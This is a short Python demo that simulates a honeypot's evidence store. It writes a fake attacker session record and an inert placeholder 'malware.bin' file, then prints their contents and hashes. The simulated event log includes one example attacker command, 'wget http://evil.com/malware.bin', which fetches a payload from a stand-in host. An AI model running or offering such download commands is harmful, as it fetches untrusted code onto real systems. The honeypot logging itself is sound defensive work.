import json, time
from pathlib import Path

# Direct minimal demo of evidence_store
BASE = Path("data") / "sessions"
BASE.mkdir(parents=True, exist_ok=True)

sid = f"S-{int(time.time())}"
sdir = BASE / sid
sdir.mkdir(exist_ok=True)

# Simulate session
session_meta = {
    "session_id": sid,
    "src_ip": "203.0.113.42",
    "src_port": 54321,
    "start_ts": time.time(),
    "instance": "honeypot-primary",
    "events": [
        {"ts": time.time(), "text": "SSH-2.0-OpenSSH_7.4"},
        {"ts": time.time(), "text": "root@192.168.1.1"},
        {"ts": time.time(), "text": "wget http://evil.com/malware.bin"},
        {"ts": time.time(), "text": "[CLASS]=exploit|0.85|ENG=HIGH"},
        {"ts": time.time(), "text": "[PAYLOAD_SAVED]={'file': 'malware.bin', 'sha256': 'abc123...', 'size': 2048}"}
    ]
}

meta_file = sdir / "meta.json"
with open(meta_file, "w") as f:
    json.dump(session_meta, f, indent=2)

# Simulate payload capture
payload_data = b"\x4d\x5a\x90\x00" + b"fake PE header" * 100
payload_path = sdir / "malware.bin"
with open(payload_path, "wb") as f:
    f.write(payload_data)

print("\n" + "="*70)
print("HONEYPOT FINAL OUTPUT - SESSION EVIDENCE CAPTURED")
print("="*70)

with open(meta_file, "r") as f:
    final_session = json.load(f)

print(f"\nSession Directory: {sdir}")
print(f"Session ID: {sid}\n")
print(json.dumps(final_session, indent=2))

print(f"\n[+] Payload files captured:")
for p in sdir.glob("*.bin"):
    sha = __import__("hashlib").sha256(p.read_bytes()).hexdigest()
    print(f"    - {p.name}: {p.stat().st_size} bytes, SHA256={sha[:16]}...")

print("\n[+] Dashboard accessible at: http://localhost:8501")
print("[+] Orchestrator listening on: 127.0.0.1:2222")
print("\n" + "="*70)
